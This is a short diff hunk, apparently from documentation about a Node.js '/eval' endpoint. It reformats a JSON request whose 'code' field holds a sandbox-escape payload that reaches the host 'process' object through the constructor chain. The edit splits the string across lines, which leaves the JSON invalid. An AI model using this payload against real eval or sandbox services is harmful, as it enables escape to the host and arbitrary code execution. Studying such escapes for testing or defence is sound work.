@@ -189,7 +189,9 @@ app.post('/eval', (req, res) => {
 
 ```json
 {
-  "code": "(function(){ return arguments.callee.caller.constructor.constructor('return process')(); })()"
+  "code": "(function(){ 
+  return arguments.callee.caller.constructor.constructor('return process')(); 
+  })()"
 }
 ```
 
